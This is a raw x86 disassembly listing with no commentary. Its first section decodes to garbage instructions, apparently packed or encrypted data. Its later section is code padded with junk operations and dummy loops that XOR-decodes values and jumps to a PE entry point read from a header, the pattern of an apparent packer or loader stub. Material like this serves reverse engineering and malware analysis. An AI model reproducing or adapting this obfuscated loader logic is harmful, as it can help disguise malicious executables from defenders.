  40d688:	mov    edi,0xc40f5dc4
  40d68d:	and    DWORD PTR [eax],edx
  40d68f:	daa    
  40d690:	pop    ebp
  40d691:	mov    ds:0xd7063dde,al
  40d696:	push   eax
  40d698:	sub    DWORD PTR [ebx-0x5763eb60],ebx
  40d69e:	ss test al,0xec
  40d6a1:	inc    ebp
  40d6a2:	mov    ebp,0x619111cd
  40d6a7:	add    al,0x5b
  40d6a9:	add    bh,dh
  40d6ab:	sbb    BYTE PTR [ebp+0x41],al
  40d6ae:	iret   
  40d6af:	retf   0xdbb8
  40d6b2:	sti    
  40d6b3:	pop    edx
  40d6b4:	and    BYTE PTR [edx-0x64],dh
  40d6b7:	aam    0x53
  40d6b9:	jo     0x40d688
  40d6bb:	outs   dx,DWORD PTR ds:[esi]
  40d6bc:	data16 and al,BYTE PTR [esi]
  40d6bf:	jge    0x40d701
  40d6c1:	aad    0x3b
  40d6c3:	enter  0xb1c,0xc2
  40d6c7:	lds    edx,FWORD PTR [ecx-0x5b355ae]
  40d6cd:	aad    0xeb
  40d6cf:	in     al,0x9a
  40d6d1:	sub    al,0xa1
  40d6d3:	cdq    
  40d6d4:	jle    0x40d660
  40d6d6:	sub    al,0x8d
  40d6d8:	xchg   ecx,eax
  40d6d9:	pop    esi
  40d6da:	xor    bh,BYTE PTR [ebp+0x8a8907b]
  40d6e0:	sub    al,0xbc
  40d6e2:	mov    ebp,DWORD PTR [edi-0x71514fa5]
  40d6e8:	rcr    BYTE PTR [ebp+0x712bc76],1
  40d6ee:	outs   dx,BYTE PTR ds:[esi]
  40d6ef:	jl     0x40d6d4
  40d6f1:	dec    eax
  40d6f2:	pop    esi
  40d6f3:	cmp    cl,BYTE PTR [edi]
  40d6f5:	loopne 0x40d6ed
  40d6f7:	inc    ecx
  40d6f8:	test   eax,0x8d0256c7
  40d6fd:	je     0x40d75d
  40d6ff:	push   ss
  40d700:	jbe    0x40d6bf
  40d702:	jb     0x40d6da
  40d704:	push   esi
  40d705:	dec    edi
  40d706:	sbb    al,0xb3
  40d708:	jae    0x40d76e
  40d70a:	stos   BYTE PTR es:[edi],al
  40d70b:	xor    edi,DWORD PTR [ecx-0x14]
  40d70e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d70f:	stos   BYTE PTR es:[edi],al
  40d710:	aad    0xd8
  40d712:	xchg   ebx,eax
  40d713:	ror    DWORD PTR [ebx+eiz*8-0x7f18eec],1
  40d71a:	jge    0x40d782
  40d71c:	cmp    dl,BYTE PTR [edx]
  40d71e:	arpl   WORD PTR [eax-0x32],bx
  40d721:	cmp    BYTE PTR [ebx-0xe91d82c],ch
  40d727:	mov    edx,0x2af844fc
  40d72c:	(bad)  
  40d72d:	mov    eax,0x9cb969d7
  40d732:	dec    eax
  40d733:	cwde   
  40d734:	hlt    
  40d735:	popa   
  40d736:	xchg   ecx,eax
  40d737:	(bad)  
  40d738:	pop    ecx
  40d739:	cld    
  40d73a:	fs loope 0x40d719
  40d73d:	add    BYTE PTR ss:[ecx-0x45736ba6],dh
  40d744:	push   edi
  40d745:	daa    
  40d746:	int    0xb3
  40d748:	icebp  
  40d749:	bsf    edx,DWORD PTR [eax+0x32]
  40d74d:	sub    dh,bl
  40d74f:	int3   
  40d750:	mov    al,ds:0x138ce2f8
  40d755:	cwde   
  40d756:	pop    edi
  40d757:	jmp    0x40d71d
  40d759:	jnp    0x40d72c
  40d75b:	add    ecx,edi
  40d75d:	xchg   ecx,eax
  40d75e:	mov    edx,0x14afefc3
  40d763:	mov    ds:0x1b4cc847,al
  40d768:	lea    eax,[ebp-0x1b]
  40d76b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d76c:	jae    0x40d6f4
  40d76e:	(bad)  
  40d76f:	fcmovnb st,st(0)
  40d771:	add    BYTE PTR [edi+eax*2-0x2b],ah
  40d775:	xor    BYTE PTR [edi],dl
  40d777:	pop    es
  40d778:	ins    DWORD PTR es:[edi],dx
  40d779:	and    ebx,DWORD PTR [ebx-0x8934ac4]
  40d77f:	sahf   
  40d780:	cdq    
  40d781:	out    dx,eax
  40d782:	sbb    al,0x6d
  40d784:	bound  dx,DWORD PTR [ebx+0x23]
  40d788:	adc    BYTE PTR ds:0xe7d55373,ah
  40d78e:	mov    WORD PTR cs:[eax],ss
  40d791:	stos   BYTE PTR es:[edi],al
  40d792:	mov    ah,0x99
  40d794:	and    eax,0x18785e44
  40d799:	push   ebp
  40d79a:	lods   al,BYTE PTR ds:[esi]
  40d79b:	inc    eax
  40d79c:	(bad)  
  40d79d:	xor    al,0x48
  40d79f:	jnp    0x40d7cc
  40d7a1:	dec    edi
  40d7a2:	dec    eax
  40d7a3:	cmp    edx,ebp
  40d7a5:	add    al,0x2b
  40d7a7:	mov    ebx,eax
  40d7a9:	add    ch,BYTE PTR cs:[ebp-0x6801057]
  40d7b0:	leave  
  40d7b1:	push   eax
  40d7b2:	xor    eax,0xf540c911
  40d7b7:	jb     0x40d740
  40d7b9:	leave  
  40d7ba:	sbb    DWORD PTR ds:0x7b32aa3a,eax
  40d7c0:	iret   
  40d7c1:	dec    ebx
  40d7c2:	and    al,BYTE PTR [eax]
  40d7c4:	push   0x7
  40d7c6:	jg     0x40d780
  40d7c8:	push   esp
  40d7c9:	mov    ch,0x40
  40d7cb:	pusha  
  40d7cc:	fdivr  DWORD PTR [esi]
  40d7ce:	ds inc edx
  40d7d0:	push   0xfffffff4
  40d7d2:	ss push edi
  40d7d4:	rcl    BYTE PTR ds:0x6a80f097,0x8f
  40d7db:	jb     0x40d7bc
  40d7dd:	fild   WORD PTR [ecx+0x4ecadb7d]
  40d7e3:	pop    edx
  40d7e4:	mov    gs,WORD PTR [edx-0x6178e974]
  40d7ea:	dec    edx
  40d7eb:	adc    al,0xd1
  40d7ed:	imul   ebx,DWORD PTR ds:0x922cdee6,0xf331230d
  40d7f7:	mul    BYTE PTR [ebx+0xf]
  40d7fa:	lea    ebp,[edi+0x25]
  40d7fd:	inc    eax
  40d7fe:	sahf   
  40d7ff:	push   ecx
  40d800:	dec    ebx
  40d801:	call   0xde8f:0x534791d7
  40d808:	outs   dx,DWORD PTR ds:[esi]
  40d809:	int    0x96
  40d80b:	(bad)  
  40d80c:	dec    esp
  40d80d:	stos   DWORD PTR es:[edi],eax
  40d80e:	cld    
  40d80f:	adc    ch,BYTE PTR ds:0x9c89d2ad
  40d815:	sahf   
  40d816:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40d818:	inc    esp
  40d819:	cmp    DWORD PTR [edi+0x16],ecx
  40d81c:	mov    bh,0xfb
  40d81e:	loop   0x40d867
  40d820:	inc    ecx
  40d821:	jmp    0xd78f742
  40d826:	(bad)  
  40d828:	nop
  40d829:	leave  
  40d82a:	(bad)  
  40d82b:	retf   
  40d82c:	inc    esp
  40d82d:	sbb    BYTE PTR [ecx-0x2],dl
  40d830:	and    esi,eax
  40d832:	gs jno 0x40d8a4
  40d835:	inc    ebx
  40d836:	cmp    DWORD PTR [eax+0x31],ecx
  40d839:	xor    BYTE PTR [edi],dh
  40d83b:	or     DWORD PTR [edi-0x33313c86],ecx
  40d841:	add    BYTE PTR [ebp-0x2270a7e8],bh
  40d847:	aam    0x60
  40d849:	push   esp
  40d84a:	adc    dh,BYTE PTR [edx]
  40d84c:	jge    0x40d826
  40d84e:	rol    BYTE PTR [ebx],0xfa
  40d851:	jb     0x40d8c8
  40d853:	pop    edi
  40d854:	add    DWORD PTR [ebp-0x261e519d],0x74093dde
  40d85e:	cli    
  40d85f:	sub    ebp,DWORD PTR [edi-0x53f33ebd]
  40d865:	jecxz  0x40d8de
  40d867:	xchg   ebp,eax
  40d868:	(bad)  
  40d869:	es inc edx
  40d86b:	xchg   esp,esp
  40d86d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d86e:	mov    bl,0x5f
  40d870:	inc    esi
  40d871:	push   eax
  40d872:	add    edi,DWORD PTR [ebp-0x10]
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fde9,0x42e21c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fe76,0x42fdf1
  40d8af:	call   DWORD PTR ds:0x42e597
  40d8b5:	and    DWORD PTR ds:0x42fdfd,0x42fe82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e234,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e224,0x42fde9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e60f
  40d8ee:	sbb    DWORD PTR ds:0x42e7fb,0x42fe72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fdf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e557
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fe05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fe76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e224,0x42e7f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fe6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fded,0x42e218
  40d977:	call   DWORD PTR ds:0x42e59f
  40d97d:	mov    DWORD PTR ds:0x42e21c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e48f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fe01,0x42e234
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fded,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e3fb
  40d9be:	mov    DWORD PTR ds:0x42fe8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e218,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fdf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fdf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fdf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fdf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e28d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e64f
  40da20:	cmp    DWORD PTR ds:0x42fdf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fdf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fdf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fdf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e803,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e7f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fdd1,0x42e21c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fe05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fe05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fe05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e653
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fe05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fe05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e807,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e807,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e807,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e563
  40dae4:	cmp    DWORD PTR ds:0x42e807,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e807
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e807,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e807
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e807,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e7ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e7ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e7ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e657
  40db41:	cmp    DWORD PTR ds:0x42e7ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e7ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e7ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e7ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e7ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fe76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fe76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fe76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e65b
  40db97:	cmp    DWORD PTR ds:0x42fe76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fe76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fe76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fe76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fe76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e807,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e813,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fe7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fde5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fde5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fde5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fde5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fde5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e567
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e228,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fe01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fe09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e7f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e7f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e7f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e56b
  40dcaa:	cmp    DWORD PTR ds:0x42e7f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e7f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e7f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e7f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e7f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fe82,0x42e22c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fe82,0x42e224
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fdd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e218,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fe72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fe72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fe72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fe72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fe72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e56f
  40dd4f:	cmp    DWORD PTR ds:0x42fe72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fe72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fe72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fe0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e230,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fe09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fe86,0x42fdfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e7f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e7ff,0x42fe8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e7eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fde5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fde5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fde5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fde5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fe09
  40de0d:	push   0x42e36d
  40de12:	call   DWORD PTR ds:0x42e573
  40de18:	cmp    DWORD PTR ds:0x42fde5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fe21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fdfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fdf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fdf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fdf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e65f
  40de65:	mov    edx,DWORD PTR ds:0x42fdf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fdf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
